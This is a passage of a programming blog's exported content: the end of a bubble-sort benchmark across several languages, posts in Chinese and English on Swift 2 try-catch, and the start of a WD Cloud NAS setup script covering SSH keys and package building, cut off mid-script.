int[]&#123;83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21&#125;; int t; for (int c &#x3D; 0; c &lt; 100; c++) &#123; for (int i &#x3D; 0; i &lt; array.length; i++) &#123; for (int y &#x3D; 0; y &lt; array.length - 1; y++) &#123; if (array[y+1] &lt; array[y]) &#123; t &#x3D; array[y]; array[y] &#x3D; array[y+1]; array[y+1] &#x3D; t; &#125; &#125; &#125; &#125; &#125; &#125; Javascript (nodejs v0.10.25) array &#x3D; [83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67, 29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24, 15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45, 14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39, 95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81, 75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23, 18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36, 32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38, 6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42, 64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26, 22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63, 99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12, 48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84, 58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9, 81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26, 59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46, 68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21, 60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15, 27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41, 69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12, 86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12, 79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45, 83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70, 99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37, 40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83, 7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5, 82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46, 35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4, 51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96, 79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4, 54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69, 18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9, 39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13, 57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99, 62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20, 92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50, 57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57, 66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21]; for (c &#x3D; 0; c &lt; 100; c++) &#123; for (i &#x3D; 0; i &lt; array.length; i++) &#123; for (y &#x3D; 0; y &lt; array.length - 1; y++) &#123; if (array[y+1] &lt; array[y]) &#123; t &#x3D; array[y]; array[y] &#x3D; array[y+1]; array[y+1] &#x3D; t; &#125; &#125; &#125; &#125; PHP (5.6.11-1ubuntu3.1) &lt;?PHP $array &#x3D; array(83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21); for ($c &#x3D; 0; $c &lt; 100; $c++) &#123; for ($i &#x3D; 0; $i &lt; count($array); $i++) &#123; for ($y &#x3D; 0; $y &lt; count($array) - 1; $y++) &#123; if ($array[$y+1] &lt; $array[$y]) &#123; $t &#x3D; $array[$y]; $array[$y] &#x3D; $array[$y+1]; $array[$y+1] &#x3D; $t; &#125; &#125; &#125; &#125; ?&gt; Python (Python 2.7.10) from array import * array_ &#x3D; array(&#39;i&#39;, [83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21] for c in range(0, 100): for i in range(0, len(array_)): for y in range(0, len(array_) - 1): if array_[y+1] &lt; array_[y]: t &#x3D; array_[y] array_[y] &#x3D; array_[y+1] array_[y+1] &#x3D; t Java is the winner! At least for the dummy who doesn’t know how to set optimization flag. Results Warning: No optimization flag uses for all compilers/interpreters. You will experience huge differences once you apply those flag. I will not go deep into this topic. (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_4e45b6021')); var option = { title: { text: 'Time (ms) of bubble sort in different language', subtext: 'Lower is better', left: 'center' }, tooltip: { trigger: 'axis', axisPointer: { type: 'shadow' } }, xAxis: { type: 'category', data: ['Swift', 'Go', 'C (gcc)', 'C (clang)'], axisLabel: { rotate: 30 } }, yAxis: { type: 'value', name: 'Time (ms)', min: 0 }, series: [ { name: 'Bubble Sort Time', type: 'bar', data: [5850, 740, 218, 193], itemStyle: { color: function(params) { const colors = ['#c23531', '#2f4554', '#61a0a8', '#91c7ae']; return colors[params.dataIndex]; } }, label: { show: true, position: 'top' } } ] };; chart.setOption(option); } })(); Sources in GitHub https://github.com/neoalienson/c_java_javascript_go_php_python_swift 📖 neoalienson/c_java_javascript_go_php_python_swift ⭐ 1 Stars 🍴 0 Forks Language: Swift","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"},{"name":"C#","slug":"C","permalink":"https://neo01.com/tags/C/"},{"name":"Go","slug":"Go","permalink":"https://neo01.com/tags/Go/"},{"name":"PHP","slug":"PHP","permalink":"https://neo01.com/tags/PHP/"},{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"}]},{"title":"介紹 Apple Swift 2 的 try-catch，以及 IBM Bluemix 的網頁沙盒","slug":"2015/12/apple-swift-2-sandbox-on-web-by-ibm-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2015/12/apple-swift-2-sandbox-on-web-by-ibm/","permalink":"https://neo01.com/zh-TW/2015/12/apple-swift-2-sandbox-on-web-by-ibm/","excerpt":"Swift 2 的 try-catch 比 Go 更優雅？在 IBM 網頁沙盒中親自體驗 Swift 2.2 的新特性","text":"Apple Swift 最初是用於 iOS 應用程式開發的程式語言。它可以在 Mac 的 Xcode 中找到。 現在 Apple Swift 2 託管在 IBM Bluemix 的網站 (http://swiftlang.ng.bluemix.net)。截至今天，Swift 版本為 2.2-dev， Swift version 2.2-dev (LLVM 46be9ff861, Clang 4deb154edc, Swift 778f82939c) Target: x86_64-unknown-linux-gnu Swift 2 引入了許多語言特性。讓我們從範例程式碼開始介紹優雅的 try-catch 特性， &#x2F;* Basic Fibonacci function in swift. Demonstrates func calls and recursion. *&#x2F; func Fibonacci(i: Int) throws -&gt; Int &#123; if i &lt;&#x3D; 2 &#123; return 1 &#125; else &#123; return **try** Fibonacci(i - 1) + Fibonacci(i - 2) &#125; &#125; do &#123; try print(Fibonacci(22)) &#x2F;* do something that doesn&#39;t throw in the middle *&#x2F; &#x2F;&#x2F; the keyword reminds you below function will throw try print(Fibonacci(11)) &#125; catch &#123; print(&quot;error&quot;) &#125; 該函數實際上並沒有拋出任何東西，但你可以看到會拋出的函數呼叫都以 try 為前綴。 Swift 語言在這個特性上的演進速度似乎比 Google 的 Go 語言快一點。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"}],"lang":"zh-TW"},{"title":"介绍 Apple Swift 2 的 try-catch，以及 IBM Bluemix 的网页沙盒","slug":"2015/12/apple-swift-2-sandbox-on-web-by-ibm-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2015/12/apple-swift-2-sandbox-on-web-by-ibm/","permalink":"https://neo01.com/zh-CN/2015/12/apple-swift-2-sandbox-on-web-by-ibm/","excerpt":"Swift 2 的 try-catch 比 Go 更优雅？在 IBM 网页沙盒中亲自体验 Swift 2.2 的新特性","text":"Apple Swift 最初是用于 iOS 应用程序开发的编程语言。它可以在 Mac 的 Xcode 中找到。 现在 Apple Swift 2 托管在 IBM Bluemix 的网站 (http://swiftlang.ng.bluemix.net)。截至今天，Swift 版本为 2.2-dev， Swift version 2.2-dev (LLVM 46be9ff861, Clang 4deb154edc, Swift 778f82939c) Target: x86_64-unknown-linux-gnu Swift 2 引入了许多语言特性。让我们从示例代码开始介绍优雅的 try-catch 特性， &#x2F;* Basic Fibonacci function in swift. Demonstrates func calls and recursion. *&#x2F; func Fibonacci(i: Int) throws -&gt; Int &#123; if i &lt;&#x3D; 2 &#123; return 1 &#125; else &#123; return **try** Fibonacci(i - 1) + Fibonacci(i - 2) &#125; &#125; do &#123; try print(Fibonacci(22)) &#x2F;* do something that doesn&#39;t throw in the middle *&#x2F; &#x2F;&#x2F; the keyword reminds you below function will throw try print(Fibonacci(11)) &#125; catch &#123; print(&quot;error&quot;) &#125; 该函数实际上并没有抛出任何东西，但你可以看到会抛出的函数调用都以 try 为前缀。 Swift 语言在这个特性上的演进速度似乎比 Google 的 Go 语言快一点。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"}],"lang":"zh-CN"},{"title":"Introducing try-catch from Apple Swift 2, with sandbox on web by IBM Bluemix","slug":"2015/12/apple-swift-2-sandbox-on-web-by-ibm","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2015/12/apple-swift-2-sandbox-on-web-by-ibm/","permalink":"https://neo01.com/2015/12/apple-swift-2-sandbox-on-web-by-ibm/","excerpt":"Is Swift 2's try-catch more elegant than Go? Try Swift 2.2's new error handling features yourself in IBM's web-based sandbox.","text":"Apple Swift is a programming language for iOS application development at the beginning. It can be found on Mac’s Xcode. Now Apple Swift 2 is hosted on IBM Bluemix’s website (http://swiftlang.ng.bluemix.net). The Swift version is 2.2-dev as of today, Swift version 2.2-dev (LLVM 46be9ff861, Clang 4deb154edc, Swift 778f82939c) Target: x86_64-unknown-linux-gnu There are many language features introduced in Swift 2. Let’s begin with the elegant try-catch feature from a sample code, &#x2F;* Basic Fibonacci function in swift. Demonstrates func calls and recursion. *&#x2F; func Fibonacci(i: Int) throws -&gt; Int &#123; if i &lt;&#x3D; 2 &#123; return 1 &#125; else &#123; return **try** Fibonacci(i - 1) + Fibonacci(i - 2) &#125; &#125; do &#123; try print(Fibonacci(22)) &#x2F;* do something that doesn&#39;t throw in the middle *&#x2F; &#x2F;&#x2F; the keyword reminds you below function will throw try print(Fibonacci(11)) &#125; catch &#123; print(&quot;error&quot;) &#125; The function doesn’t really throw anything, but you can see the function calls that throw are prefixed with try. The evolution speed of Swift language seems a little bit faster than Google’s Go language on this feature.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"}]},{"title":"WD Cloud 固件更新后的设置脚本","slug":"2015/10/setup-script-after-wd-cloud-firmware-updated-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2015/10/setup-script-after-wd-cloud-firmware-updated/","permalink":"https://neo01.com/zh-CN/2015/10/setup-script-after-wd-cloud-firmware-updated/","excerpt":"固件更新后失去所有配置？自动化脚本帮你恢复 SSH 和包设置","text":"每当 WD Cloud 固件更新时，你会失去所有自定义配置。以下脚本帮助我恢复我的设置， 更新 SSH 服务器以使用公钥认证 登录 WD Cloud 的 root 并在服务器端创建 .ssh， mkdir ~&#x2F;.ssh 从你的机器上传公钥到服务器，将 nas 替换为你的主机/IP 地址。 scp ~&#x2F;.ssh&#x2F;id_rsa.pub root@_**nas**_:~&#x2F;.ssh&#x2F;authorized_keys 在服务器端 chmod go-rwx ~&#x2F;.ssh sed -i.bak &quot;s&#x2F;PubkeyAuthentication no&#x2F;PubkeyAuthentication yes&#x2F;&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;init.d&#x2F;ssh restart 你可以在不输入密码的情况下 ssh 到 nas。简而言之， # 从你自己的机器执行 # 先决条件，你已经在 ~&#x2F;.ssh 中生成了公钥&#x2F;私钥对 # 配置 export TARGET_SERVER&#x3D;nas ssh root@$TARGET_SERVER mkdir ~&#x2F;.ssh 从你的机器上传公钥到服务器，将 nas 替换为你的主机&#x2F;IP 地址。 scp ~&#x2F;.ssh&#x2F;id_rsa.pub root@nas:~&#x2F;.ssh&#x2F;authorized_keys 在服务器端 ssh root@$TARGET_SERVER &lt;&lt; EOF chmod go-rwx ~&#x2F;.ssh sed -i.bak &quot;s&#x2F;PubkeyAuthentication no&#x2F;PubkeyAuthentication yes&#x2F;&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;init.d&#x2F;ssh restart EOF 如果你不想构建包，你可以从 https://app.box.com/wdcloud 下载。我会尽量保持更新。 构建一般包的脚本 以下脚本构建包，例如 transmission、joe 等 # 根据我的个人偏好为 WD Cloud（ubuntu、arm）构建有用的组件 ### 配置 ### # 你的 WD cloud 主机名称 export SERVER_HOST&#x3D;nas # 目标云端版本 WD_VERSION&#x3D;04.04.02-105 ### 执行 ### # 下载并解压缩 gpl 源代码和构建工具 wget http:&#x2F;&#x2F;download.wdc.com&#x2F;gpl&#x2F;gpl-source-wd_my_cloud-$WD_VERSION.zip rm -rf packages unzip gpl-source-wd_my_cloud-$WD_VERSION.zip packages&#x2F;build_tools&#x2F;debian&#x2F;* mkdir 64k-wheezy cp -R packages&#x2F;build_tools&#x2F;debian&#x2F;* .&#x2F;64k-wheezy echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt; 64k-wheezy&#x2F;build.sh echo &#39;.&#x2F;build-armhf-package.sh --pagesize&#x3D;64k $1 wheezy&#39; &gt;&gt; 64k-wheezy&#x2F;build.sh chmod a+x 64k-wheezy&#x2F;build.sh cd 64k-wheezy .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build mv build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static_orig cp &#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static # 覆盖 build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list # 可选，直到你需要使用 backports 包 echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports 